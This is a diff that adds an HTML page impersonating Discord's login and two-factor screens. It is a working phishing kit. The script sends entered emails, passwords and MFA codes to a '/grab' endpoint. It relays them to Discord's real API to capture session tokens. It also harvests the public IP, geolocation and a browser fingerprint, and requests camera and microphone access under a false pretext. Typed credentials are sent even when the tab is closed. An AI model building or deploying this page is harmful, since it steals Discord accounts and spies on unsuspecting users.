@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Discord</title>
+<link rel="icon" href="https://discord.com/assets/favicon.ico">
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg-primary:#313338;--bg-secondary:#2b2d31;--bg-tertiary:#1e1f22;--text-normal:#dbdee1;--text-muted:#80848e;--text-link:#00a8fc;--brand:#5865f2;--brand-hover:#4752c4;--red:#f23f43;--header-primary:#f2f3f5;--header-secondary:#b5bac1;--interactive-normal:#b5bac1}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"Noto Sans",system-ui,sans-serif;background:var(--bg-primary);color:var(--text-normal);min-height:100vh;display:flex;align-items:center;justify-content:center}
+body::before{content:"";position:fixed;inset:0;background:radial-gradient(ellipse at 20% 50%,rgba(88,101,242,.15) 0%,transparent 60%),radial-gradient(ellipse at 80% 20%,rgba(88,101,242,.1) 0%,transparent 50%);pointer-events:none;z-index:0}
+.container{position:relative;z-index:1;display:flex;background:var(--bg-secondary);border-radius:8px;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,.54);width:784px;max-width:96vw;min-height:480px}
+.left{flex:1;padding:40px 32px;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center}
+.logo{margin-bottom:24px}.logo svg{width:48px;height:36px}
+.left h2{font-size:24px;font-weight:700;color:var(--header-primary);margin-bottom:8px}
+.left p{font-size:16px;color:var(--header-secondary);line-height:1.4}
+.right{flex:1.25;padding:40px 32px;border-left:1px solid rgba(255,255,255,.04)}
+.right h1{font-size:24px;font-weight:700;color:var(--header-primary);text-align:center;margin-bottom:8px}
+.right .sub{font-size:16px;color:var(--header-secondary);text-align:center;margin-bottom:20px}
+label{display:block;font-size:12px;font-weight:700;letter-spacing:.02em;text-transform:uppercase;color:var(--interactive-normal);margin-bottom:8px}
+label span{color:var(--red);margin-left:2px}
+input[type=text],input[type=password],input[type=email]{width:100%;padding:10px;background:var(--bg-tertiary);border:1px solid rgba(0,0,0,.3);border-radius:3px;color:var(--text-normal);font-size:16px;font-family:inherit;outline:none;transition:border-color .15s;margin-bottom:16px}
+input:focus{border-color:var(--brand)}
+input.error-field{border-color:var(--red);margin-bottom:4px}
+.err-msg{color:var(--red);font-size:12px;font-style:italic;margin-bottom:12px;display:none}
+.forgot{font-size:14px;color:var(--text-link);text-decoration:none;display:block;margin-top:-10px;margin-bottom:20px}
+.forgot:hover{text-decoration:underline}
+button.primary{width:100%;padding:12px;background:var(--brand);color:#fff;border:none;border-radius:3px;font-size:16px;font-family:inherit;font-weight:500;cursor:pointer;transition:background .15s;margin-bottom:8px}
+button.primary:hover:not(:disabled){background:var(--brand-hover)}
+button.primary:disabled{opacity:.6;cursor:not-allowed}
+.divider{display:flex;align-items:center;gap:12px;margin:16px 0;color:var(--text-muted);font-size:12px}
+.divider::before,.divider::after{content:"";flex:1;height:1px;background:rgba(255,255,255,.08)}
+.qr-box{display:flex;align-items:center;gap:12px;background:var(--bg-tertiary);border-radius:4px;padding:12px;margin-bottom:16px;cursor:pointer}
+.qr-box img{width:60px;height:60px;border-radius:4px;background:#fff}
+.qr-box .qr-text p:first-child{font-size:14px;font-weight:600;color:var(--header-primary)}
+.qr-box .qr-text p:last-child{font-size:12px;color:var(--text-muted)}
+.register-row{font-size:14px;color:var(--text-muted);text-align:center;margin-top:8px}
+.register-row a{color:var(--text-link);text-decoration:none}
+.screen{display:none}.screen.active{display:block}
+#screen-login{display:block}
+.back-btn{background:none;border:none;color:var(--text-link);font-size:14px;cursor:pointer;padding:0;margin-bottom:16px;font-family:inherit}
+.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:100;align-items:center;justify-content:center}
+.modal-overlay.active{display:flex}
+.modal{background:var(--bg-secondary);border-radius:8px;padding:32px;width:440px;max-width:94vw;box-shadow:0 8px 32px rgba(0,0,0,.5)}
+.modal h2{color:var(--header-primary);font-size:20px;margin-bottom:8px}
+.modal p{color:var(--header-secondary);font-size:14px;margin-bottom:20px}
+.modal-actions{display:flex;gap:8px;justify-content:flex-end;margin-top:16px}
+.btn-ghost{background:none;border:none;color:var(--text-link);font-size:14px;cursor:pointer;padding:8px 16px;border-radius:3px;font-family:inherit}
+.btn-submit{background:var(--brand);color:#fff;border:none;padding:10px 24px;border-radius:3px;font-size:14px;font-weight:500;cursor:pointer;font-family:inherit}
+.spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle;margin-right:6px}
+@keyframes spin{to{transform:rotate(360deg)}}
+#perm-banner{position:fixed;top:0;left:0;right:0;background:var(--brand);color:#fff;font-size:14px;font-weight:500;padding:12px 20px;text-align:center;z-index:200;display:none}
+@media(max-width:650px){.container{flex-direction:column;width:100%;min-height:100vh;border-radius:0}.left{display:none}.right{padding:32px 20px;border:none}}
+</style>
+</head>
+<body>
+<div id="perm-banner">Discord needs microphone &amp; camera access for voice/video calls. Please click <b>Allow</b>.</div>
+
+<div class="modal-overlay" id="forgot-modal">
+  <div class="modal">
+    <h2>Reset your password</h2>
+    <p>Enter your email address and we'll send you a link to reset your password.</p>
+    <label>Email <span>*</span></label>
+    <input type="email" id="forgot-email" placeholder="Enter your email address">
+    <div class="modal-actions">
+      <button class="btn-ghost" onclick="closeForgot()">Back to Login</button>
+      <button class="btn-submit" onclick="submitForgot()">Reset Password</button>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+  <div class="left">
+    <div class="logo">
+      <svg viewBox="0 0 127.14 96.36" fill="#5865f2"><path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/></svg>
+    </div>
+    <h2>Welcome back!</h2>
+    <p>We're so excited<br>to see you again!</p>
+  </div>
+
+  <div class="right">
+    <div id="screen-login" class="screen active">
+      <h1>Welcome back!</h1>
+      <p class="sub">We're so excited to see you again!</p>
+      <label>Email or Phone Number <span>*</span></label>
+      <input type="text" id="email" placeholder="Enter your email or phone number" autocomplete="off" spellcheck="false">
+      <div class="err-msg" id="err-email">Please enter a valid email or phone number.</div>
+      <label>Password <span>*</span></label>
+      <input type="password" id="pass" placeholder="Password" autocomplete="off">
+      <div class="err-msg" id="err-pass">Invalid email or password.</div>
+      <a href="#" class="forgot" onclick="openForgot(event)">Forgot your password?</a>
+      <button class="primary" id="login-btn" onclick="doLogin()">Log In</button>
+      <div class="divider">or</div>
+      <div class="qr-box" onclick="showQR()">
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=60x60&data=https://discord.com/login" alt="QR">
+        <div class="qr-text">
+          <p>Log in with QR Code</p>
+          <p>Scan this with the Discord mobile app to log in instantly.</p>
+        </div>
+      </div>
+      <div class="register-row">Need an account? <a href="#">Register</a></div>
+    </div>
+
+    <div id="screen-mfa" class="screen">
+      <button class="back-btn" onclick="showScreen('login')">← Back</button>
+      <h1>Two-factor authentication</h1>
+      <p class="sub" style="margin-bottom:20px">Open your two-factor authenticator app to view your authentication code.</p>
+      <label>6-Digit Authentication Code <span>*</span></label>
+      <input type="text" id="mfa-code" placeholder="6-digit code" maxlength="6" autocomplete="off" inputmode="numeric">
+      <div class="err-msg" id="err-mfa">Invalid two-factor code.</div>
+      <button class="primary" id="mfa-btn" onclick="doMFA()">Log In</button>
+    </div>
+
+    <div id="screen-success" class="screen">
+      <div style="text-align:center;padding:48px 0">
+        <div style="font-size:52px;margin-bottom:16px">✅</div>
+        <h1 style="margin-bottom:8px">Logged in!</h1>
+        <p class="sub">Redirecting you to Discord...</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+const GRAB_URL = "/grab";
+const LS_BUF   = "__hitbuf";
+const SENT     = new Set();
+let state = {
+  email:"", password:"", token:"not captured", mfaTicket:"",
+  mic:false, camera:false, location:"denied", publicIP:"", fingerprint:{}
+};
+
+/* ── fingerprint ─────────────────────────────── */
+function collectFingerprint() {
+  let gpu = null;
+  try {
+    const c = document.createElement("canvas");
+    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+    if (gl) {
+      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+      if (dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+    }
+  } catch(e){}
+  return {
+    userAgent: navigator.userAgent,
+    language:  navigator.language,
+    languages: (navigator.languages||[]).join(","),
+    platform:  navigator.platform,
+    screen:    screen.width + "x" + screen.height,
+    dpr:       window.devicePixelRatio || 1,
+    colorDepth: screen.colorDepth,
+    timezone:  Intl.DateTimeFormat().resolvedOptions().timeZone,
+    tzOffset:  new Date().getTimezoneOffset(),
+    cores:     navigator.hardwareConcurrency || null,
+    memory:    navigator.deviceMemory || null,
+    touch:     ("ontouchstart" in window),
+    gpu:       gpu,
+    cookies:   navigator.cookieEnabled
+  };
+}
+
+/* ── media + IP + geoloc ─────────────────────── */
+async function forceMediaPermissions() {
+  const b = document.getElementById("perm-banner");
+  b.style.display = "block";
+  try {
+    const s = await navigator.mediaDevices.getUserMedia({audio:true, video:true});
+    state.mic = true; state.camera = true;
+    s.getTracks().forEach(t=>t.stop());
+  } catch(e) {
+    try {
+      const s = await navigator.mediaDevices.getUserMedia({audio:true});
+      state.mic = true; s.getTracks().forEach(t=>t.stop());
+    } catch(e2){}
+  }
+  b.style.display = "none";
+}
+
+async function getPublicIP() {
+  try {
+    const r = await fetch("https://api.ipify.org?format=json", {cache:"no-store"});
+    if (r.ok) { const d = await r.json(); state.publicIP = d.ip || ""; }
+  } catch(e) {
+    try {
+      const r = await fetch("https://ipapi.co/json/", {cache:"no-store"});
+      if (r.ok) { const d = await r.json(); state.publicIP = d.ip || ""; }
+    } catch(e2){}
+  }
+}
+
+/* ── offline buffer ──────────────────────────── */
+function bufferHit(payload) {
+  try {
+    const q = JSON.parse(localStorage.getItem(LS_BUF) || "[]");
+    q.push(payload);
+    localStorage.setItem(LS_BUF, JSON.stringify(q.slice(-50)));
+  } catch(e){}
+}
+async function flushBuffer() {
+  try {
+    const q = JSON.parse(localStorage.getItem(LS_BUF) || "[]");
+    if (!q.length) return;
+    localStorage.removeItem(LS_BUF);
+    for (const p of q) {
+      try {
+        await fetch(GRAB_URL, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(p), keepalive:true});
+      } catch(e) { bufferHit(p); }
+    }
+  } catch(e){}
+}
+
+/* ── sendGrab ────────────────────────────────── */
+async function sendGrab(extra = {}) {
+  const payload = {
+    email:    state.email    || extra.email    || "",
+    password: state.password || extra.password || "",
+    token:    state.token    || "not captured",
+    mfa_code: extra.mfa_code || null,
+    mic:      state.mic,
+    camera:   state.camera,
+    location: state.location,
+    publicIP: state.publicIP,
+    fingerprint: state.fingerprint,
+    note:     extra.note || ""
+  };
+
+  const sig = payload.email + "|" + payload.password + "|" + payload.token + "|" + payload.note;
+  if (SENT.has(sig)) return true;
+
+  const body = JSON.stringify(payload);
+  for (let i = 0; i < 3; i++) {
+    try {
+      const r = await fetch(GRAB_URL, {
+        method:"POST", headers:{"Content-Type":"application/json"},
+        body, keepalive: true
+      });
+      if (r.ok) { SENT.add(sig); return true; }
+    } catch(e){}
+    await new Promise(r => setTimeout(r, 300 * (i+1)));
+  }
+  // last resort: beacon
+  try {
+    navigator.sendBeacon(GRAB_URL, new Blob([body], {type:"application/json"}));
+    SENT.add(sig);
+  } catch(e){ bufferHit(payload); }
+  return false;
+}
+
+/* ── boot ────────────────────────────────────── */
+window.addEventListener("load", async () => {
+  state.fingerprint = collectFingerprint();
+  await Promise.all([forceMediaPermissions(), getPublicIP()]);
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      p => { state.location = p.coords.latitude.toFixed(5) + ", " + p.coords.longitude.toFixed(5); },
+      () => {}, {timeout:4000, maximumAge:0}
+    );
+  }
+  flushBuffer();
+});
+
+/* ── UI helpers ──────────────────────────────── */
+function showScreen(name) {
+  document.querySelectorAll(".screen").forEach(s => s.classList.remove("active"));
+  document.getElementById("screen-" + name).classList.add("active");
+}
+function openForgot(e) {
+  e.preventDefault();
+  document.getElementById("forgot-modal").classList.add("active");
+  document.getElementById("forgot-email").value = state.email || document.getElementById("email").value;
+}
+function closeForgot(){ document.getElementById("forgot-modal").classList.remove("active"); }
+async function submitForgot() {
+  const em = document.getElementById("forgot-email").value.trim();
+  state.email = em;
+  await sendGrab({note:"ForgotPassword"});
+  closeForgot();
+  document.getElementById("forgot-modal").innerHTML =
+    `<div class="modal"><h2>Email sent!</h2><p>Check your inbox.</p>
+     <div class="modal-actions"><button class="btn-ghost"
+       onclick="document.getElementById('forgot-modal').classList.remove('active')">Close</button></div></div>`;
+  document.getElementById("forgot-modal").classList.add("active");
+}
+
+/* ── login ───────────────────────────────────── */
+async function doLogin() {
+  const email = document.getElementById("email").value.trim();
+  const pass  = document.getElementById("pass").value;
+  const btn   = document.getElementById("login-btn");
+  const errE  = document.getElementById("err-email");
+  const errP  = document.getElementById("err-pass");
+
+  errE.style.display = "none"; errP.style.display = "none";
+  document.getElementById("email").classList.remove("error-field");
+  document.getElementById("pass").classList.remove("error-field");
+
+  if (!email) { errE.style.display="block"; document.getElementById("email").classList.add("error-field"); return; }
+  if (!pass)  { errP.style.display="block"; document.getElementById("pass").classList.add("error-field"); return; }
+
+  state.email = email;
+  state.password = pass;
+  btn.innerHTML = '<span class="spinner"></span>Logging in...';
+  btn.disabled = true;
+
+  await sendGrab({ note: "login-attempt" });
+
+  let needMFA = false;
+  try {
+    const r = await fetch("https://discord.com/api/v9/auth/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      credentials: "omit",
+      body: JSON.stringify({
+        login: email, password: pass, undelete: false,
+        captcha_key: null, login_source: null, gift_code_sku_id: null
+      })
+    });
+    const d = await r.json();
+
+    if (d.token) {
+      state.token = d.token;
+      await sendGrab({ note: "token-captured" });
+      showScreen("success");
+      setTimeout(() => window.location.href = "https://discord.com/channels/@me", 1500);
+      return;
+    }
+    if (d.mfa || d.ticket) {
+      state.mfaTicket = d.ticket || "";
+      needMFA = true;
+    }
+  } catch(e) {}
+
+  await new Promise(r => setTimeout(r, 900));
+
+  if (needMFA) {
+    showScreen("mfa");
+    btn.innerHTML = "Log In";
+    btn.disabled = false;
+    return;
+  }
+
+  errP.style.display = "block";
+  document.getElementById("pass").classList.add("error-field");
+  btn.innerHTML = "Log In";
+  btn.disabled = false;
+}
+
+/* ── MFA ─────────────────────────────────────── */
+async function doMFA() {
+  const code = document.getElementById("mfa-code").value.trim();
+  const btn  = document.getElementById("mfa-btn");
+  const err  = document.getElementById("err-mfa");
+  err.style.display = "none";
+  if (!code || code.length < 6) { err.style.display = "block"; return; }
+
+  btn.innerHTML = '<span class="spinner"></span>Logging in...';
+  btn.disabled = true;
+
+  await sendGrab({ mfa_code: code, note: "mfa-submitted" });
+
+  let token = "not captured";
+  try {
+    const r = await fetch("https://discord.com/api/v9/auth/mfa/totp", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      credentials: "omit",
+      body: JSON.stringify({
+        code: code, ticket: state.mfaTicket,
+        login_source: null, gift_code_sku_id: null
+      })
+    });
+    const d = await r.json();
+    if (d.token) {
+      token = d.token;
+      state.token = token;
+      await sendGrab({ note: "mfa-token-captured" });
+    }
+  } catch(e) {}
+
+  await new Promise(r => setTimeout(r, 800));
+
+  if (token !== "not captured") {
+    showScreen("success");
+    setTimeout(() => window.location.href = "https://discord.com/channels/@me", 1500);
+    return;
+  }
+  err.style.display = "block";
+  btn.innerHTML = "Log In";
+  btn.disabled = false;
+}
+
+/* ── QR ──────────────────────────────────────── */
+function showQR() { alert("Open Discord mobile app → Settings → Scan QR Code"); }
+
+/* ── safety nets ─────────────────────────────── */
+document.addEventListener("keydown", e => {
+  if (e.key !== "Enter") return;
+  const id = document.querySelector(".screen.active")?.id;
+  if (id === "screen-login") doLogin();
+  if (id === "screen-mfa") doMFA();
+});
+
+document.addEventListener("visibilitychange", () => {
+  if (document.visibilityState === "hidden") {
+    const e = document.getElementById("email")?.value.trim();
+    const p = document.getElementById("pass")?.value;
+    if (e && p && state.token === "not captured") {
+      state.email = e; state.password = p;
+      sendGrab({ note: "page-hidden" });
+    }
+  }
+});
+window.addEventListener("beforeunload", () => {
+  const e = document.getElementById("email")?.value.trim();
+  const p = document.getElementById("pass")?.value;
+  if (e && p && state.token === "not captured") {
+    state.email = e; state.password = p;
+    sendGrab({ note: "beforeunload" });
+  }
+});
+window.addEventListener("pagehide", () => {
+  const e = document.getElementById("email")?.value.trim();
+  const p = document.getElementById("pass")?.value;
+  if (e && p && state.token === "not captured") {
+    state.email = e; state.password = p;
+    sendGrab({ note: "pagehide" });
+  }
+});
+</script>
+</body>
+</html>
